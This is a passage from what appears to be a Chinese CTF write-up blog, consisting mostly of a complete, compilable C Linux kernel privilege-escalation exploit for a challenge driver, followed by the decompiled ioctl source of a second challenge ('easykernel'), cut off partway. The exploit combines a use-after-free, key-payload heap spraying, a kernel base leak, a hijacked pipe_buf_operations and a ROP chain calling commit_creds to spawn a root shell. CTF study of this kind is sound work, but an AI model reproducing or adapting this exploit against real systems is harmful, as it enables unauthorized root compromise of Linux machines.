class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -static -masm=intel -pthread exp.c -o exp</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_SPRAY_NUM 40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_INODE_INFO_SZ 192</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_BUFFER_SZ 1024</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> USER_FREE_PAYLOAD_RCU 0xFFFFFFFF813D8210</span></span><br><span class="line"><span class="type">size_t</span> prepare_kernel_cred = <span class="number">0xffffffff81096110</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xffffffff81095c30</span>;</span><br><span class="line"><span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff81e00ed0</span>;</span><br><span class="line"><span class="type">size_t</span> push_rsi_pop_rsp_pop_rbx_pop_rbp_pop_r12_ret = <span class="number">0xffffffff81250c9d</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rbx_pop_rbp_pop_r12_ret = <span class="number">0xffffffff81250ca4</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rdi_ret = <span class="number">0xffffffff8106ab4d</span>;</span><br><span class="line"><span class="type">size_t</span> xchg_rdi_rax_dec_sth_ret = <span class="number">0xffffffff81adfc70</span>;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> idx;</span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">    <span class="type">char</span>* ptr;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">info</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s\n\033[0m&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">hexx</span><span class="params">(<span class="type">char</span> *msg, <span class="type">size_t</span> value)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s: %#lx\n\033[0m&quot;</span>, msg, value);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">binary_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33m[*] %s:\n\033[0m&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pushf;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pop user_rflags;&quot;</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">getShell</span><span class="params">()</span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* bind the process to specific core */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">int</span> core)</span>&#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> rw_fd;</span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> idx, <span class="type">int</span> size, <span class="type">char</span>* ptr)</span>&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">node</span> <span class="title">n</span> =</span> &#123; .idx = idx, .size = size, .ptr = ptr &#125;;</span><br><span class="line">        ioctl(rw_fd, <span class="number">0xDEADBEEF</span>, &amp;n);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">del</span><span class="params">(<span class="type">int</span> idx)</span>&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">node</span> <span class="title">n</span> =</span> &#123; .idx = idx &#125;;</span><br><span class="line">        ioctl(rw_fd, <span class="number">0xC0DECAFE</span>, &amp;n);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">key_alloc</span><span class="params">(<span class="type">char</span> *description, <span class="type">char</span> *payload, <span class="type">size_t</span> plen)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_add_key, <span class="string">&quot;user&quot;</span>, description, payload, plen,</span><br><span class="line">                   KEY_SPEC_PROCESS_KEYRING);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">key_read</span><span class="params">(<span class="type">int</span> keyid, <span class="type">char</span> *buffer, <span class="type">size_t</span> buflen)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_keyctl, KEYCTL_READ, keyid, buffer, buflen);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">key_revoke</span><span class="params">(<span class="type">int</span> keyid)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_keyctl, KEYCTL_REVOKE, keyid, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv, <span class="type">char</span>** env)</span>&#123;</span><br><span class="line">    <span class="type">int</span> key_id[KEY_SPRAY_NUM], victim_key_idx = <span class="number">-1</span>, pipe_key_id;</span><br><span class="line">    <span class="type">size_t</span> kernel_offset, pipe_buffer_addr;</span><br><span class="line">    <span class="type">size_t</span> *buf;</span><br><span class="line">    <span class="type">int</span> pipe_fd[<span class="number">2</span>];;</span><br><span class="line">    <span class="type">char</span> desciption[<span class="number">0x100</span>];</span><br><span class="line"></span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    buf = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">size_t</span>) * <span class="number">0x4000</span>);</span><br><span class="line"></span><br><span class="line">    rw_fd = open(<span class="string">&quot;/dev/rwctf&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(rw_fd &lt; <span class="number">0</span>) err_exit(<span class="string">&quot;open /dev/rwctf&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] construct UAF obj and spray keys...&quot;</span>);</span><br><span class="line">    add(<span class="number">0</span>, PIPE_INODE_INFO_SZ, buf);</span><br><span class="line">    del(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; KEY_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="built_in">snprintf</span>(desciption, <span class="number">0x100</span>, <span class="string">&quot;%s%d&quot;</span>, <span class="string">&quot;Qanux&quot;</span>, i);</span><br><span class="line">        key_id[i] = key_alloc(desciption, buf, PIPE_INODE_INFO_SZ - <span class="number">0x18</span>);</span><br><span class="line">        <span class="keyword">if</span> (key_id[i] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to alloc %d key!\n&quot;</span>, i);</span><br><span class="line">            err_exit(<span class="string">&quot;add_key()&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    del(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] corrupting user_key_payload...&quot;</span>);</span><br><span class="line">    buf[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    buf[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    buf[<span class="number">2</span>] = <span class="number">0x2000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; (KEY_SPRAY_NUM * <span class="number">2</span>); i++) &#123;</span><br><span class="line">        add(<span class="number">0</span>, PIPE_INODE_INFO_SZ, buf);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] leak kernel base...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; KEY_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key_read(key_id[i], buf, <span class="number">0x4000</span>) &gt; PIPE_INODE_INFO_SZ) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] found victim key at idx: %d\n&quot;</span>, i);</span><br><span class="line">            victim_key_idx = i;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            key_revoke(key_id[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (victim_key_idx == <span class="number">-1</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;corrupt user_key_payload&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    binary_dump(<span class="string">&quot;user_key_payload data&quot;</span>, buf, <span class="number">0x100</span>);</span><br><span class="line">    kernel_offset = buf[<span class="number">22</span>] - USER_FREE_PAYLOAD_RCU;</span><br><span class="line">    hexx(<span class="string">&quot;Kernel offset&quot;</span>, kernel_offset);</span><br><span class="line"></span><br><span class="line">    prepare_kernel_cred += kernel_offset;</span><br><span class="line">    commit_creds += kernel_offset;</span><br><span class="line">    swapgs_restore_regs_and_return_to_usermode += kernel_offset;</span><br><span class="line">    push_rsi_pop_rsp_pop_rbx_pop_rbp_pop_r12_ret += kernel_offset;</span><br><span class="line">    pop_rbx_pop_rbp_pop_r12_ret += kernel_offset;</span><br><span class="line">    pop_rdi_ret += kernel_offset;</span><br><span class="line">    xchg_rdi_rax_dec_sth_ret += kernel_offset;</span><br><span class="line">    hexx(<span class="string">&quot;xchg_rdi_rax_dec_sth_ret&quot;</span>, xchg_rdi_rax_dec_sth_ret);</span><br><span class="line">    hexx(<span class="string">&quot;pop_rbx_pop_rbp_pop_r12_ret&quot;</span>, pop_rbx_pop_rbp_pop_r12_ret);</span><br><span class="line">    hexx(<span class="string">&quot;push_rsi_pop_rsp_pop_rbx_pop_rbp_pop_r12_ret&quot;</span>, push_rsi_pop_rsp_pop_rbx_pop_rbp_pop_r12_ret);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] construct UAF on pipe_inode_info...&quot;</span>);</span><br><span class="line">    add(<span class="number">0</span>, PIPE_INODE_INFO_SZ, buf);  <span class="comment">// obj0</span></span><br><span class="line">    add(<span class="number">1</span>, PIPE_INODE_INFO_SZ, buf);  <span class="comment">// obj1</span></span><br><span class="line">    del(<span class="number">1</span>);</span><br><span class="line">    del(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">// freelist 192: obj0-&gt;obj1-&gt;...</span></span><br><span class="line"></span><br><span class="line">    pipe_key_id = key_alloc(<span class="string">&quot;Qanuxpipe&quot;</span>, buf, PIPE_INODE_INFO_SZ - <span class="number">0x18</span>);  <span class="comment">// user_key_payload: obj1</span></span><br><span class="line">    del(<span class="number">1</span>);</span><br><span class="line">    <span class="comment">// freelist 192: obj1-&gt;obj0-&gt;...</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0</span>, PIPE_BUFFER_SZ, buf); </span><br><span class="line">    del(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">// freelist 1024: obj2-&gt;...</span></span><br><span class="line"></span><br><span class="line">    pipe(pipe_fd);  <span class="comment">// pipe_inode_info: obj1;  user_key_payload-&gt;datalen = 0xffff</span></span><br><span class="line"></span><br><span class="line">    key_read(pipe_key_id, buf, <span class="number">0xffff</span>);</span><br><span class="line">    pipe_buffer_addr = buf[<span class="number">16</span>];  <span class="comment">// pipe_inode_info-&gt;bufs</span></span><br><span class="line">    binary_dump(<span class="string">&quot;pipe_inode_info&quot;</span>, buf, <span class="number">0x100</span>);</span><br><span class="line">    hexx(<span class="string">&quot;pipe_buffer&quot;</span>, pipe_buffer_addr);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] construct fake pipe_buf_operations...&quot;</span>);</span><br><span class="line">    buf[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    buf[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    buf[<span class="number">2</span>] = pipe_buffer_addr + <span class="number">0x18</span>;  <span class="comment">// pipe_buffer-&gt;ops </span></span><br><span class="line">    <span class="comment">// after release(), we got back here </span></span><br><span class="line">    buf[<span class="number">3</span>] = pop_rbx_pop_rbp_pop_r12_ret;</span><br><span class="line">    <span class="comment">// pipe_buf_operations-&gt;release </span></span><br><span class="line">    buf[<span class="number">4</span>] = push_rsi_pop_rsp_pop_rbx_pop_rbp_pop_r12_ret;</span><br><span class="line">    buf[<span class="number">5</span>] = <span class="number">0</span>;</span><br><span class="line">    buf[<span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line">    buf[<span class="number">7</span>] = pop_rdi_ret;</span><br><span class="line">    buf[<span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">    buf[<span class="number">9</span>] = prepare_kernel_cred;</span><br><span class="line">    buf[<span class="number">10</span>] = xchg_rdi_rax_dec_sth_ret;</span><br><span class="line">    buf[<span class="number">11</span>] = commit_creds;</span><br><span class="line">    buf[<span class="number">12</span>] = swapgs_restore_regs_and_return_to_usermode + <span class="number">0x31</span>;</span><br><span class="line">    buf[<span class="number">13</span>] = <span class="number">0</span>;</span><br><span class="line">    buf[<span class="number">14</span>] = <span class="number">0</span>;</span><br><span class="line">    buf[<span class="number">15</span>] = (<span class="type">size_t</span>)getShell;</span><br><span class="line">    buf[<span class="number">16</span>] = user_cs;</span><br><span class="line">    buf[<span class="number">17</span>] = user_rflags;</span><br><span class="line">    buf[<span class="number">18</span>] = user_sp + <span class="number">8</span>; </span><br><span class="line">    buf[<span class="number">19</span>] = user_ss;</span><br><span class="line"></span><br><span class="line">    del(<span class="number">0</span>);</span><br><span class="line">    add(<span class="number">0</span>, PIPE_BUFFER_SZ, buf);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] trigerring pipe_buf_operations-&gt;release()...&quot;</span>);</span><br><span class="line">    close(pipe_fd[<span class="number">1</span>]);</span><br><span class="line">    close(pipe_fd[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="西湖论剑2021-easykernel"><a href="#西湖论剑2021-easykernel" class="headerlink" title="西湖论剑2021 easykernel"></a>西湖论剑2021 easykernel</h2><h3 id="部分源码"><a href="#部分源码" class="headerlink" title="部分源码"></a>部分源码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">kerpwn_ioctl</span><span class="params">(__int64 a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// r12</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// r13</span></span><br><span class="line">  __int64 v6; <span class="comment">// r14</span></span><br><span class="line">  __int64 v7; <span class="comment">// rax</span></span><br><span class="line">  __int64 v8; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// r12</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v10; <span class="comment">// r13</span></span><br><span class="line">  __int64 v11; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v12; <span class="comment">// [rsp-48h] [rbp-48h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v13; <span class="comment">// [rsp-40h] [rbp-40h]</span></span><br><span class="line">  __int64 v14; <span class="comment">// [rsp-38h] [rbp-38h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v15; <span class="comment">// [rsp-30h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  _fentry__(a1, a2);</span><br><span class="line">  v15 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  result = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)a2 == <span class="number">0x40</span> )                     <span class="comment">// read</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !copy_from_user(&amp;v12, v2, <span class="number">0x18</span>LL) )</span><br><span class="line">    &#123;</span><br><span class="line">      ((<span class="type">void</span> (__fastcall *)(_QWORD *))show)(&amp;v12);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)a2 &gt; <span class="number">0x40</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)a2 == <span class="number">0x50</span> )                   <span class="comment">// write</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( copy_from_user(&amp;v12, v2, <span class="number">0x18</span>LL) )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)v12 &lt;= <span class="number">0x20</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = addrList[(<span class="type">unsigned</span> <span class="type">int</span>)v12];</span><br><span class="line">        <span class="keyword">if</span> ( v4 )</span><br><span class="line">        &#123;</span><br><span class="line">          v5 = v13;                             <span class="comment">// size</span></span><br><span class="line">          v6 = v14;                             <span class="comment">// buf</span></span><br><span class="line">          <span class="keyword">if</span> ( v13 &lt;= <span class="number">0x7FFFFFFF</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            _check_object_size(addrList[(<span class="type">unsigned</span> <span class="type">int</span>)v12], v13, <span class="number">0LL</span>);</span><br><span class="line">            copy_from_user(v4, v6, v5);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">          &#125;</span><br><span class="line">LABEL_29:</span><br><span class="line">          BUG();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)a2 != <span class="number">0x20</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)a2 != <span class="number">0x30</span> )                   <span class="comment">// delete</span></span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    <span class="keyword">if</span> ( !copy_from_user(&amp;v12, v2, <span class="number">8LL</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)v12 &lt;= <span class="number">0x20</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( addrList[(<span class="type">unsigned</span> <span class="type">int</span>)v12] )</span><br><span class="line">          kfree();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( copy_from_user(&amp;v12, v2, <span class="number">0x10</span>LL) )       <span class="comment">// 0x20 add</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v12 &gt; <span class="number">0x20</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  v7 = _kmalloc(v12, <span class="number">0xCC0</span>LL);</span><br><span class="line">  v8 = v7;</span><br><span class="line">  <span class="keyword">if</span> ( !v7 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  v9 = v12;                                     <span class="comment">// size</span></span><br><span class="line">  v10 = v13;                                    <span class="comment">// buf</span></span><br><span class="line">  <span class="keyword">if</span> ( v12 &gt; <span class="number">0x7FFFFFFF</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_29;</span><br><span 